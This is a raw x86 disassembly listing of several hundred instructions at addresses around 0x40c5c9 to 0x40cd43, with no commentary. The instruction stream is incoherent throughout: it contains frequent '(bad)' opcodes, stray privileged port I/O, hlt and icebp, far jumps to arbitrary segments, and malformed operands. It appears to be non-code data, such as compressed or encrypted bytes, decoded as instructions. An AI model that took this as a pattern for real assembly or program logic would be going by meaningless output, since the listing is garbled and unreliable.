  40c5c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5ca:	sbb    DWORD PTR [ebx-0x21012622],edx
  40c5d0:	fs mov bh,0x8e
  40c5d3:	mov    dl,0x24
  40c5d5:	fcomi  st,st(0)
  40c5d7:	jp     0x40c588
  40c5d9:	add    al,0x1e
  40c5db:	and    BYTE PTR [ebx+0x54],bh
  40c5de:	(bad)  
  40c5e0:	sahf   
  40c5e1:	sub    eax,edi
  40c5e3:	retf   
  40c5e4:	shr    DWORD PTR [esi-0x1ce825af],1
  40c5ea:	sub    DWORD PTR [edi+ebp*2-0x74],edi
  40c5ee:	sbb    BYTE PTR [edx],0x3d
  40c5f1:	push   ebp
  40c5f2:	(bad)  
  40c5f3:	cwde   
  40c5f4:	in     eax,0xe1
  40c5f6:	xchg   BYTE PTR [ebx+edx*2+0x78],ah
  40c5fa:	sbb    eax,0x5302b202
  40c5ff:	push   eax
  40c600:	mov    cl,0xf8
  40c602:	fsub   QWORD PTR [ecx-0x28913cb0]
  40c608:	imul   eax,DWORD PTR [eax+edx*2-0x2],0x242035da
  40c610:	cli    
  40c611:	test   eax,0x235a717a
  40c616:	icebp  
  40c617:	push   0xdee99b50
  40c61c:	jo     0x40c614
  40c61e:	daa    
  40c61f:	sub    edx,0x2697fa41
  40c625:	jmp    0xdbda:0x9b1253aa
  40c62c:	popa   
  40c62d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c62e:	mov    bl,0x36
  40c630:	fsubr  st,st(2)
  40c632:	hlt    
  40c633:	shl    DWORD PTR [eax],1
  40c635:	js     0x40c5d3
  40c637:	cmp    al,0xe3
  40c639:	dec    esp
  40c63a:	call   0x306f:0x210c7a16
  40c641:	xchg   ebp,eax
  40c642:	scas   eax,DWORD PTR es:[edi]
  40c643:	push   cs
  40c644:	xchg   esp,eax
  40c645:	gs cmp al,0xbe
  40c648:	cmp    ah,0xa5
  40c64b:	push   edi
  40c64c:	pop    esp
  40c64d:	ficom  WORD PTR [ecx]
  40c64f:	inc    esi
  40c650:	xchg   esi,eax
  40c651:	cmp    al,0x21
  40c653:	jbe    0x40c69e
  40c655:	test   eax,0x2ad19513
  40c65a:	jecxz  0x40c62b
  40c65c:	mov    eax,0xe34f1559
  40c661:	sub    ecx,esp
  40c663:	retf   
  40c664:	dec    esp
  40c665:	hlt    
  40c666:	out    0x2,eax
  40c668:	iret   
  40c669:	shr    edi,cl
  40c66b:	imul   DWORD PTR [ebx]
  40c66d:	cmc    
  40c66e:	xor    DWORD PTR [eax],eax
  40c670:	sub    DWORD PTR [esi-0x52d72b9b],esi
  40c676:	rcr    DWORD PTR [ebx-0x6caf6587],0x40
  40c67d:	stos   BYTE PTR es:[edi],al
  40c67e:	int3   
  40c67f:	into   
  40c680:	sub    eax,ebx
  40c682:	mov    eax,0x7abe447f
  40c687:	mov    edx,0x38d97a08
  40c68c:	cld    
  40c68d:	dec    eax
  40c68e:	sbb    BYTE PTR ss:[ebx-0x66],ch
  40c692:	rcr    DWORD PTR [edx],0xb
  40c695:	or     dh,0x6d
  40c698:	ror    DWORD PTR [ecx+esi*4-0x304d470c],1
  40c69f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6a0:	sbb    dh,cl
  40c6a2:	dec    ecx
  40c6a3:	or     bh,BYTE PTR [ebx]
  40c6a5:	lds    edi,FWORD PTR [ebp+0x1be12c91]
  40c6ab:	ds mov esp,0x35978b4d
  40c6b1:	push   eax
  40c6b2:	mov    ch,0x2
  40c6b4:	das    
  40c6b5:	sub    DWORD PTR [eax+0x6a],edx
  40c6b8:	out    0x45,eax
  40c6ba:	mov    ecx,DWORD PTR [eax]
  40c6bc:	inc    edi
  40c6bd:	add    DWORD PTR [esi+edi*2+0x74e83fd1],esp
  40c6c4:	mov    BYTE PTR [ebx-0x6c],al
  40c6c7:	mov    ecx,0x21f4dcb3
  40c6cc:	jae    0x40c699
  40c6ce:	dec    edi
  40c6cf:	sub    bl,BYTE PTR [esi-0x72f9cf65]
  40c6d5:	ror    edx,1
  40c6d7:	cmp    BYTE PTR [ebx+0x2cdfdce2],dh
  40c6dd:	adc    al,0x3b
  40c6df:	ins    BYTE PTR es:[edi],dx
  40c6e0:	push   cs
  40c6e1:	push   edi
  40c6e2:	inc    ebx
  40c6e3:	jmp    0x8d51:0xcb9f6e25
  40c6ea:	inc    esp
  40c6eb:	int3   
  40c6ec:	push   ecx
  40c6ed:	in     al,0x5
  40c6ef:	push   eax
  40c6f0:	adc    edi,ebx
  40c6f2:	push   edi
  40c6f3:	and    BYTE PTR ds:0xfa9fe24d,ch
  40c6f9:	test   eax,0x25081228
  40c6fe:	add    esi,DWORD PTR [ecx+0x7eb05212]
  40c704:	mov    bl,0xfb
  40c706:	push   edx
  40c707:	stos   DWORD PTR es:[edi],eax
  40c708:	jne    0x40c71f
  40c70a:	jmp    0x40c733
  40c70c:	mov    ds:0x48af7451,al
  40c711:	sbb    BYTE PTR [edx-0x1c],ah
  40c714:	add    eax,DWORD PTR [ebp+0x1b]
  40c717:	daa    
  40c718:	pop    esi
  40c719:	or     DWORD PTR [ebx+0x77],esi
  40c71c:	ins    DWORD PTR es:[edi],dx
  40c71d:	pop    edx
  40c71e:	pop    edx
  40c71f:	pop    ecx
  40c720:	cdq    
  40c721:	cmp    DWORD PTR [edx+0x7d],esp
  40c724:	outs   dx,DWORD PTR ds:[esi]
  40c725:	aaa    
  40c726:	mov    ebx,0xaedbf7de
  40c72b:	xchg   BYTE PTR [eax+0x69],dl
  40c72e:	lahf   
  40c72f:	pop    edx
  40c730:	mov    ds,eax
  40c732:	add    al,0xac
  40c734:	jge    0x40c75c
  40c736:	mov    dh,0xbe
  40c738:	and    ah,BYTE PTR [ecx+0x2c]
  40c73b:	out    0x30,al
  40c73d:	mov    bl,0x5a
  40c73f:	outs   dx,DWORD PTR ds:[esi]
  40c740:	dec    edi
  40c741:	test   eax,0xb45f0863
  40c746:	std    
  40c747:	mov    ds:0x99c62b0,eax
  40c74c:	fs sbb eax,0xe6a12734
  40c752:	inc    DWORD PTR [ecx+0x78]
  40c755:	js     0x40c70d
  40c757:	pop    esi
  40c758:	ins    BYTE PTR es:[edi],dx
  40c759:	and    bl,BYTE PTR [ebx+edx*2-0x68986305]
  40c760:	enter  0x9a98,0x58
  40c764:	mov    esi,0xf78b157c
  40c769:	inc    ebp
  40c76a:	sbb    BYTE PTR [edi-0x48],0xb1
  40c76e:	(bad)  
  40c76f:	int    0xb3
  40c771:	jg     0x40c7b5
  40c773:	sub    eax,0xc48fd52e
  40c778:	push   eax
  40c779:	xchg   ebx,eax
  40c77a:	shl    BYTE PTR [ecx],0xaa
  40c77d:	push   ds
  40c77e:	cmp    DWORD PTR [esi-0xd],0x52
  40c782:	je     0x40c72b
  40c784:	dec    esi
  40c785:	push   eax
  40c786:	into   
  40c787:	add    bl,BYTE PTR [esi]
  40c789:	loopne 0x40c7b4
  40c78b:	ror    BYTE PTR [esi+0x1b1392bb],1
  40c791:	jne    0x40c7d5
  40c793:	push   ebx
  40c794:	clc    
  40c795:	push   eax
  40c796:	outs   dx,DWORD PTR ds:[esi]
  40c797:	dec    ebp
  40c798:	ret    0x67f6
  40c79b:	pop    ebx
  40c79c:	xchg   DWORD PTR [eax+0x43397161],eax
  40c7a2:	jns    0x40c7e6
  40c7a4:	sbb    eax,DWORD PTR [ebx]
  40c7a6:	push   ecx
  40c7a7:	sub    BYTE PTR [ebp+0x6f],0xc2
  40c7ab:	cli    
  40c7ac:	sub    DWORD PTR [ecx-0x21780e3d],edi
  40c7b2:	ins    BYTE PTR es:[edi],dx
  40c7b3:	adc    BYTE PTR [edx],0x9
  40c7b6:	lahf   
  40c7b7:	or     al,0xde
  40c7b9:	push   ebp
  40c7ba:	pop    esi
  40c7bb:	jb     0x40c763
  40c7bd:	add    dl,dh
  40c7bf:	cwde   
  40c7c0:	std    
  40c7c1:	call   0x4cac:0xf38519f5
  40c7c8:	test   eax,0x89133473
  40c7cd:	popf   
  40c7ce:	es out dx,al
  40c7d0:	push   ecx
  40c7d1:	fld    TBYTE PTR [edi]
  40c7d3:	cmp    dh,dh
  40c7d5:	xchg   ebx,eax
  40c7d6:	mov    edx,0xdac2e6a4
  40c7db:	fisub  WORD PTR [ebx-0x62]
  40c7de:	pop    ecx
  40c7df:	jns    0x40c76d
  40c7e1:	adc    BYTE PTR [edi-0x1979b777],al
  40c7e7:	mov    edi,0x8768ecb7
  40c7ec:	sub    ah,bl
  40c7ee:	adc    edx,DWORD PTR [esi]
  40c7f0:	dec    ebx
  40c7f1:	in     al,dx
  40c7f2:	and    BYTE PTR [edx-0x7c],0xff
  40c7f6:	pop    es
  40c7f7:	cmp    ebp,0x423ebe6b
  40c7fd:	sub    DWORD PTR [ecx-0xe9d0eb6],edi
  40c803:	ret    
  40c804:	adc    DWORD PTR [ecx],eax
  40c806:	push   ebx
  40c807:	fisttp WORD PTR [ecx+0x52]
  40c80a:	adc    BYTE PTR [eax],bl
  40c80c:	jecxz  0x40c84b
  40c80e:	sub    eax,0x9a73752e
  40c813:	je     0x40c893
  40c815:	retf   
  40c816:	or     BYTE PTR [eax-0x64fce062],0x88
  40c81d:	mov    dl,0x4
  40c81f:	add    al,0x99
  40c821:	ss jbe 0x40c7d9
  40c824:	and    dh,0x22
  40c827:	lea    esi,[eax+eax*4]
  40c82a:	jg     0x40c80f
  40c82c:	lahf   
  40c82d:	dec    DWORD PTR [ecx]
  40c82f:	imul   ebx,esp,0x3b
  40c832:	jp     0x40c89a
  40c834:	les    ebp,FWORD PTR ds:0x8d1b0d8d
  40c83a:	ror    BYTE PTR [edx+0x602e494f],1
  40c840:	jbe    0x40c88d
  40c842:	in     eax,0x66
  40c844:	repz ror BYTE PTR [ecx-0x7d],0x58
  40c849:	adc    eax,0x7aded726
  40c84e:	cmp    edx,DWORD PTR [esi]
  40c850:	in     eax,0xc4
  40c852:	test   eax,0xe221445b
  40c857:	jo     0x40c826
  40c859:	mov    dh,0x5c
  40c85b:	aaa    
  40c85c:	push   es
  40c85d:	aaa    
  40c85e:	sub    bh,ch
  40c860:	xchg   BYTE PTR [eax+0x31],al
  40c863:	mov    BYTE PTR [ebp+0x69],al
  40c866:	inc    esp
  40c867:	mov    bh,0xfa
  40c869:	jns    0x40c843
  40c86b:	imul   ebx,DWORD PTR [ecx+0x1a],0xa45eafa5
  40c872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c873:	push   ecx
  40c874:	add    BYTE PTR [edx+0x7b2decc5],bh
  40c87a:	in     eax,dx
  40c87b:	mov    al,ds:0x77f380c0
  40c880:	int3   
  40c881:	fdivr  DWORD PTR [ebx-0x6164e321]
  40c887:	or     eax,0x79c37b97
  40c88c:	add    eax,0x792a31ea
  40c891:	or     esp,ebp
  40c893:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c894:	xor    eax,0x712386c9
  40c899:	cwde   
  40c89a:	push   cs
  40c89b:	ds cwde 
  40c89d:	pop    esi
  40c89e:	sbb    bl,BYTE PTR ds:0xba33ede5
  40c8a4:	or     BYTE PTR [edi],bh
  40c8a6:	dec    BYTE PTR ds:0x45653688
  40c8ac:	cwde   
  40c8ad:	xchg   BYTE PTR [edx-0x14],dh
  40c8b0:	sbb    BYTE PTR [eax-0x69e5110a],bl
  40c8b6:	xchg   edi,eax
  40c8b7:	dec    esp
  40c8b8:	sub    DWORD PTR [ebx],0x77
  40c8bb:	lds    esp,FWORD PTR [ebx-0x68596ade]
  40c8c1:	mov    esp,0x491aae63
  40c8c6:	and    esi,esp
  40c8c8:	and    edi,esp
  40c8ca:	push   ebx
  40c8cb:	jmp    0xf30ce172
  40c8d0:	xchg   ebx,eax
  40c8d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8d2:	aad    0x38
  40c8d4:	inc    esi
  40c8d5:	icebp  
  40c8d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8d7:	inc    edx
  40c8d8:	stos   BYTE PTR es:[edi],al
  40c8d9:	cs loope 0x40c8fa
  40c8dc:	ins    BYTE PTR es:[edi],dx
  40c8dd:	aam    0x9e
  40c8df:	adc    al,0xf5
  40c8e1:	cmp    esp,DWORD PTR [edi]
  40c8e3:	or     BYTE PTR [edx],bh
  40c8e5:	mov    ds:0x349bcf83,al
  40c8ea:	mov    dh,0x23
  40c8ec:	shl    cl,cl
  40c8ee:	addr16 mov ebp,0x819f4163
  40c8f4:	out    0x50,eax
  40c8f6:	ins    BYTE PTR es:[edi],dx
  40c8f7:	and    cl,0xde
  40c8fa:	lods   eax,DWORD PTR ds:[esi]
  40c8fb:	aam    0x3c
  40c8fd:	add    cl,cl
  40c8ff:	pop    es
  40c900:	not    esi
  40c902:	jmp    0x1e67:0xaf06a756
  40c909:	push   eax
  40c90a:	ret    0x7932
  40c90d:	call   0xb185d381
  40c912:	dec    edi
  40c913:	retf   0xf24c
  40c916:	mov    al,ds:0x9a506e54
  40c91b:	mov    edx,0x3d6d1231
  40c920:	int    0xb7
  40c922:	mov    edx,0xe4bcfaa5
  40c927:	sbb    eax,0xc9fd60c0
  40c92c:	popa   
  40c92d:	icebp  
  40c92e:	call   0xba79:0xde3be5ed
  40c935:	jne    0x40c959
  40c937:	out    0x41,al
  40c939:	stc    
  40c93a:	call   0xae03:0xcba4bcd8
  40c941:	fidiv  WORD PTR ds:0x28b91444
  40c947:	(bad)  
  40c948:	in     eax,dx
  40c949:	pop    ebx
  40c94a:	retf   
  40c94b:	and    eax,0xc6e5aec5
  40c950:	retf   0x8c2a
  40c953:	dec    esp
  40c954:	sub    BYTE PTR [edi+0x3c03e553],al
  40c95a:	call   0x79c0ef05
  40c95f:	add    eax,0x5774698a
  40c964:	mov    al,0xb5
  40c966:	push   edi
  40c967:	cs or  al,0xa7
  40c96a:	stos   DWORD PTR es:[edi],eax
  40c96b:	cmp    al,0x65
  40c96d:	or     eax,0x4cf4c719
  40c972:	test   eax,0x3a406414
  40c977:	or     BYTE PTR [esi],0x73
  40c97a:	add    ch,BYTE PTR [edi+0x12]
  40c97d:	inc    edi
  40c97e:	pop    ecx
  40c97f:	pop    edx
  40c980:	not    DWORD PTR [ebx+0x55d1b267]
  40c986:	pop    esp
  40c987:	daa    
  40c988:	xchg   BYTE PTR [eax+0xd],al
  40c98b:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c98d:	inc    esp
  40c98e:	xchg   DWORD PTR [ebx+0x2a],edx
  40c991:	repnz (bad) 
  40c993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c994:	in     al,dx
  40c995:	sbb    BYTE PTR [esi],cl
  40c997:	jl     0x40c9a9
  40c999:	cmp    edx,DWORD PTR [ebp+0x1d]
  40c99c:	add    al,BYTE PTR [ecx+0x599702e]
  40c9a2:	mov    edi,0x5a7411d5
  40c9a7:	mov    ecx,0xa9eff265
  40c9ac:	or     esp,DWORD PTR [eax+0x2a2d0312]
  40c9b2:	push   DWORD PTR [ecx-0x26]
  40c9b5:	cmp    bl,BYTE PTR [eax]
  40c9b7:	and    DWORD PTR [ecx+0x3d73925f],edi
  40c9bd:	or     eax,0x2cd7f6c2
  40c9c2:	xchg   DWORD PTR ds:0xda4ae8b5,ebx
  40c9c8:	mov    edi,0x17426d18
  40c9cd:	mov    edx,DWORD PTR [edi+edx*8-0x33]
  40c9d1:	mov    ebp,0x9edb078
  40c9d6:	sbb    BYTE PTR [eax-0x26b3b6dc],ch
  40c9dc:	mov    ah,BYTE PTR [eax+0x49]
  40c9df:	lea    esp,[esi-0x2d604509]
  40c9e5:	and    eax,DWORD PTR [edi]
  40c9e7:	popa   
  40c9e8:	cli    
  40c9e9:	jno    0x40c9ea
  40c9eb:	or     bh,ch
  40c9ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9ee:	mov    edi,0xd31f3632
  40c9f3:	cmp    al,0x16
  40c9f5:	cmp    BYTE PTR [eax-0x5a515a39],ch
  40c9fb:	sahf   
  40c9fc:	ja     0x40ca75
  40c9fe:	push   edx
  40c9ff:	repnz iret 
  40ca01:	adc    al,0x51
  40ca03:	pop    esp
  40ca04:	daa    
  40ca05:	xor    al,0x0
  40ca07:	and    eax,0x9ba0890d
  40ca0c:	adc    eax,0xea417d32
  40ca11:	dec    ecx
  40ca12:	mov    ebp,0x659dc0fd
  40ca17:	dec    edx
  40ca18:	mov    ch,0xdf
  40ca1a:	je     0x40ca97
  40ca1c:	fwait
  40ca1d:	mov    ?,WORD PTR [esi+edx*1-0x19b2426d]
  40ca24:	push   edx
  40ca25:	lods   eax,DWORD PTR ds:[esi]
  40ca26:	jecxz  0x40ca1c
  40ca28:	or     eax,0x3da9e557
  40ca2d:	or     BYTE PTR [ebp+0x22fd2976],dl
  40ca33:	sbb    BYTE PTR [esp+ecx*1+0x6a],bh
  40ca37:	sub    bh,0x87
  40ca3a:	(bad)  ds:0xcfb7afb3
  40ca40:	jae    0x40ca19
  40ca42:	mov    esp,0x34bd56b0
  40ca47:	add    esi,DWORD PTR [ebx]
  40ca49:	mov    WORD PTR [eax+0x16975a2],gs
  40ca4f:	jb     0x40ca56
  40ca51:	mov    ecx,0x6822a745
  40ca56:	lods   eax,DWORD PTR ds:[esi]
  40ca57:	adc    DWORD PTR [ebx+0x7e],0x2aa0d777
  40ca5e:	jp     0x40ca11
  40ca60:	xchg   ebx,eax
  40ca61:	mov    bh,0x35
  40ca63:	iret   
  40ca64:	dec    ecx
  40ca65:	xchg   BYTE PTR [edx-0x2d52547c],bh
  40ca6b:	mov    WORD PTR [edi+0x6b],es
  40ca6e:	jecxz  0x40ca80
  40ca70:	jbe    0x40c9f6
  40ca72:	mov    BYTE PTR [ebx-0x3054fe27],ah
  40ca78:	loop   0x40ca10
  40ca7a:	push   ebx
  40ca7b:	retf   
  40ca7c:	cmp    eax,0x3050976f
  40ca81:	mov    ch,0xb4
  40ca83:	mov    es,WORD PTR [ebx+0x1e2a8d2c]
  40ca89:	dec    esp
  40ca8a:	or     edi,DWORD PTR [eax+0x29fe528]
  40ca90:	adc    edi,DWORD PTR [edi-0x69]
  40ca93:	addr16 mov ds:0xe772,al
  40ca97:	(bad)  
  40ca98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca99:	jo     0x40caf8
  40ca9b:	cli    
  40ca9c:	das    
  40ca9d:	sbb    al,0xd7
  40ca9f:	stos   BYTE PTR es:[edi],al
  40caa0:	inc    BYTE PTR [edi+0x2cc30fac]
  40caa6:	pslld  mm7,QWORD PTR [esi+0x2a]
  40caaa:	xchg   edi,eax
  40caab:	test   DWORD PTR [eax-0x47293090],ebp
  40cab1:	inc    edi
  40cab2:	sahf   
  40cab3:	std    
  40cab4:	lea    ecx,[esi+0x6ae220c2]
  40caba:	sub    eax,DWORD PTR [edx-0x2878b828]
  40cac0:	add    bh,BYTE PTR [edi-0x3fbebad9]
  40cac6:	fst    QWORD PTR [edx-0x1e]
  40cac9:	mov    di,0xa06f
  40cacd:	sub    BYTE PTR ss:[ecx+eiz*1+0x4b63077a],bh
  40cad5:	pop    esp
  40cad6:	dec    esp
  40cad7:	xlat   BYTE PTR ds:[ebx]
  40cad8:	into   
  40cad9:	mov    ebx,0x3a9a798c
  40cade:	cmp    al,0x94
  40cae0:	xor    al,0x6e
  40cae2:	mov    dl,0xe0
  40cae4:	(bad)  
  40cae5:	and    BYTE PTR [edx],ch
  40cae7:	mov    ebp,0x986fed64
  40caec:	addr16 mov bh,0x17
  40caef:	dec    esp
  40caf0:	repnz es fs fld st(3)
  40caf5:	lds    eax,FWORD PTR [edx+0x7e6c4a4d]
  40cafb:	inc    ecx
  40cafc:	fnstcw WORD PTR [esi-0x5827ccc9]
  40cb02:	cmc    
  40cb03:	and    cl,ah
  40cb05:	mov    ecx,0xd8fa9904
  40cb0a:	jb     0x40cac2
  40cb0c:	test   eax,0x376e2047
  40cb11:	pop    esp
  40cb12:	shl    eax,cl
  40cb14:	or     bl,BYTE PTR [edx-0x4462d5f9]
  40cb1a:	mov    al,ds:0x4eb6e315
  40cb1f:	arpl   WORD PTR [edi+eax*8-0x48],dx
  40cb23:	pop    esp
  40cb24:	push   ecx
  40cb25:	ret    0xc6f8
  40cb28:	fucomp st(1)
  40cb2a:	jecxz  0x40cb90
  40cb2c:	pop    ebp
  40cb2d:	lea    esp,[ecx+0xd]
  40cb30:	test   al,0xfa
  40cb32:	dec    edi
  40cb33:	ror    DWORD PTR [esi-0x2488f3d2],0xf4
  40cb3a:	adc    ecx,DWORD PTR [ebx+0x51]
  40cb3d:	outs   dx,BYTE PTR ds:[esi]
  40cb3e:	sbb    esi,DWORD PTR [ebp-0x2fc0d99d]
  40cb44:	pop    ss
  40cb45:	enter  0xf03f,0x71
  40cb49:	push   ecx
  40cb4a:	add    BYTE PTR [edx-0x39c327ea],ah
  40cb50:	fcom   QWORD PTR [ebx+0x33]
  40cb53:	inc    edi
  40cb54:	test   eax,0xc6b51a6e
  40cb59:	mov    eax,0x636b3f87
  40cb5e:	mov    WORD PTR [edi+0x36117b93],ds
  40cb64:	dec    esi
  40cb65:	loopne 0x40cb53
  40cb67:	xchg   edi,eax
  40cb68:	dec    esp
  40cb69:	in     eax,dx
  40cb6a:	dec    edx
  40cb6b:	jb     0x40cb49
  40cb6d:	rcl    BYTE PTR [edi+0x259e4b68],cl
  40cb73:	jne    0x40caf6
  40cb75:	ret    0x90b9
  40cb78:	rcr    BYTE PTR [edx-0x32157052],1
  40cb7e:	mov    cl,0x12
  40cb80:	mov    al,0xcf
  40cb82:	rcl    DWORD PTR [ebx+ebx*4],cl
  40cb85:	ss jbe 0x40cbe6
  40cb88:	sub    al,0x88
  40cb8a:	mov    ch,0x10
  40cb8c:	xor    ebp,DWORD PTR [ecx-0x75]
  40cb8f:	sbb    BYTE PTR [edx-0x7ba78f5c],cl
  40cb95:	popf   
  40cb96:	retf   0xb0fe
  40cb99:	jl     0x40cb9c
  40cb9b:	call   0x83212dc9
  40cba0:	or     BYTE PTR [ebx+0x230a6d3c],0x8e
  40cba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cba8:	jl     0x40cc16
  40cbaa:	repnz inc ecx
  40cbac:	popa   
  40cbad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbae:	(bad)  
  40cbaf:	out    dx,eax
  40cbb0:	cmp    eax,0x665c08a1
  40cbb5:	lea    ebx,ds:0x871ad077
  40cbbb:	push   ebx
  40cbbc:	mov    ss,esp
  40cbbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbbf:	fs mov al,0x86
  40cbc2:	xchg   esi,eax
  40cbc3:	rcr    DWORD PTR [ebp+0x68],cl
  40cbc6:	inc    edx
  40cbc7:	pop    ebp
  40cbc8:	test   al,0x41
  40cbca:	jae    0x40cbf0
  40cbcc:	push   ecx
  40cbcd:	sti    
  40cbce:	mov    dl,0x92
  40cbd0:	xlat   BYTE PTR ds:[ebx]
  40cbd1:	push   edi
  40cbd2:	xchg   ebx,eax
  40cbd3:	or     al,0xdf
  40cbd5:	cli    
  40cbd6:	and    edi,DWORD PTR ds:[ebx+ecx*1+0x5b89b761]
  40cbde:	aas    
  40cbdf:	jo     0x40cbc2
  40cbe1:	adc    BYTE PTR [ebx+0x49],ah
  40cbe4:	jo     0x40cbf5
  40cbe6:	call   0xb2795250
  40cbeb:	inc    edi
  40cbec:	push   eax
  40cbed:	test   BYTE PTR [ecx],al
  40cbef:	data16 arpl WORD PTR [ecx-0x2],si
  40cbf3:	test   eax,0x9869050c
  40cbf8:	ds pop ecx
  40cbfa:	dec    edx
  40cbfb:	cmp    BYTE PTR [ebx-0x29],bl
  40cbfe:	shl    BYTE PTR [ebx],0x76
  40cc01:	cmp    BYTE PTR fs:[ebp+0x33],bh
  40cc05:	pextrw ebp,(bad),0xc5
  40cc07:	sub    al,cl
  40cc09:	nop    DWORD PTR [edx]
  40cc0c:	outs   dx,DWORD PTR ds:[esi]
  40cc0d:	mov    esp,0x73a29c59
  40cc12:	inc    ecx
  40cc13:	aas    
  40cc14:	mov    al,0x5f
  40cc16:	fwait
  40cc17:	ret    0x6f5a
  40cc1a:	popa   
  40cc1b:	mov    bh,0x60
  40cc1d:	xchg   ebx,eax
  40cc1e:	and    bl,dl
  40cc20:	and    al,0xea
  40cc22:	jae    0x40cc78
  40cc24:	nop
  40cc25:	inc    ecx
  40cc26:	xor    al,BYTE PTR [esi-0x2d]
  40cc29:	sub    ebp,DWORD PTR [edi+0x1096aedd]
  40cc2f:	sub    cl,BYTE PTR [esi+0x76]
  40cc32:	push   esp
  40cc33:	ret    0x7747
  40cc36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc37:	mov    eax,0x4bf11dc0
  40cc3c:	xchg   edi,eax
  40cc3d:	(bad)  
  40cc3e:	ins    BYTE PTR es:[edi],dx
  40cc3f:	out    dx,eax
  40cc40:	ins    DWORD PTR es:[edi],dx
  40cc41:	fisub  DWORD PTR [ecx-0x41]
  40cc44:	mov    ?,WORD PTR [edx]
  40cc46:	add    cl,cl
  40cc48:	mov    esi,0x5622bca4
  40cc4d:	and    bl,BYTE PTR [ebp+0x2614099e]
  40cc53:	jp     0x40cc5a
  40cc55:	jg     0x40cc5e
  40cc57:	cli    
  40cc58:	sbb    cl,dl
  40cc5a:	xchg   edi,eax
  40cc5b:	xchg   esp,eax
  40cc5c:	and    BYTE PTR [esi-0x43d0ccb2],bl
  40cc62:	jnp    0x40cc95
  40cc64:	outs   dx,DWORD PTR ds:[esi]
  40cc65:	xchg   ecx,eax
  40cc66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc67:	dec    eax
  40cc68:	or     al,0x2f
  40cc6a:	add    ax,0x5da6
  40cc6e:	mov    BYTE PTR [ecx+0x4d],al
  40cc71:	adc    al,0xa7
  40cc73:	xchg   ebp,eax
  40cc74:	js     0x40cc65
  40cc76:	cmp    al,0x22
  40cc78:	jmp    DWORD PTR [esi+0x31]
  40cc7b:	xchg   esp,eax
  40cc7c:	xchg   esp,eax
  40cc7d:	or     DWORD PTR [ebp+0x6ab99946],ebp
  40cc83:	mov    ch,0xa1
  40cc85:	jle    0x40cc75
  40cc87:	push   es
  40cc88:	es fcomip st,st(5)
  40cc8b:	test   eax,0x7fc662cb
  40cc90:	adc    al,0xa4
  40cc92:	sub    bh,BYTE PTR [ecx-0xb]
  40cc95:	sahf   
  40cc96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc97:	jle    0x40cccc
  40cc99:	sar    BYTE PTR [eax],0x59
  40cc9c:	lods   al,BYTE PTR ds:[esi]
  40cc9d:	xchg   edx,eax
  40cc9e:	cmc    
  40cc9f:	adc    al,BYTE PTR ds:0x64676c93
  40cca5:	mov    ecx,0xd8147b70
  40ccaa:	call   0x9c9a05bf
  40ccaf:	pop    ebx
  40ccb0:	in     al,dx
  40ccb1:	or     DWORD PTR [ebp+0x46315f27],esi
  40ccb7:	cmc    
  40ccb8:	lods   eax,DWORD PTR ds:[esi]
  40ccb9:	imul   ebp,DWORD PTR fs:[edi-0x1f5930d],0x2f
  40ccc1:	pop    es
  40ccc2:	fst    st(3)
  40ccc4:	or     DWORD PTR [ebp-0x30],esi
  40ccc7:	xchg   esp,eax
  40ccc8:	mov    dh,0xed
  40ccca:	mov    cl,0x35
  40cccc:	std    
  40cccd:	pop    es
  40ccce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cccf:	jp     0x40ccc1
  40ccd1:	clc    
  40ccd2:	ss pusha 
  40ccd4:	pusha  
  40ccd5:	adc    BYTE PTR [edi+edi*8+0x5b98692],al
  40ccdc:	sahf   
  40ccdd:	adc    DWORD PTR [edi-0x50],edx
  40cce0:	jle    0x40cc63
  40cce2:	out    0xb5,al
  40cce4:	add    al,0xe0
  40cce6:	inc    ebx
  40cce7:	adc    bl,bh
  40cce9:	xchg   ecx,eax
  40ccea:	aaa    
  40cceb:	add    dl,dh
  40cced:	sbb    DWORD PTR gs:[ecx-0x7bfb4dc5],esp
  40ccf4:	aas    
  40ccf5:	inc    ebx
  40ccf6:	inc    esp
  40ccf7:	jbe    0x40cd03
  40ccf9:	(bad)  
  40ccfa:	jnp    0x40ccc1
  40ccfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ccfd:	iret   
  40ccfe:	jb     0x40cd25
  40cd00:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40cd02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd03:	clc    
  40cd04:	sahf   
  40cd05:	adc    DWORD PTR [eax+0x77c6eb03],eax
  40cd0b:	xchg   edx,eax
  40cd0c:	loope  0x40ccbf
  40cd0e:	xor    eax,0x8c9dead8
  40cd13:	int3   
  40cd14:	cmp    ah,al
  40cd16:	xor    eax,0xcc0558ce
  40cd1b:	mov    ebp,0x40cbc8bd
  40cd20:	es clc 
  40cd22:	xor    ecx,DWORD PTR [edi+eax*4]
  40cd25:	jecxz  0x40cd7a
  40cd27:	(bad)  
  40cd28:	scas   al,BYTE PTR es:[edi]
  40cd29:	add    ebp,esi
  40cd2b:	sti    
  40cd2c:	stos   DWORD PTR es:[edi],eax
  40cd2d:	add    BYTE PTR [edx+0x768fa754],dh
  40cd33:	shl    eax,1
  40cd35:	dec    ecx
  40cd36:	in     al,dx
  40cd37:	test   dh,ah
  40cd39:	dec    ebp
  40cd3a:	test   al,0xb8
  40cd3c:	jae    0x40ccf7
  40cd3e:	push   0x2
  40cd40:	(bad)  
  40cd41:	mov    ebp,edx
  40cd43:	push   edx
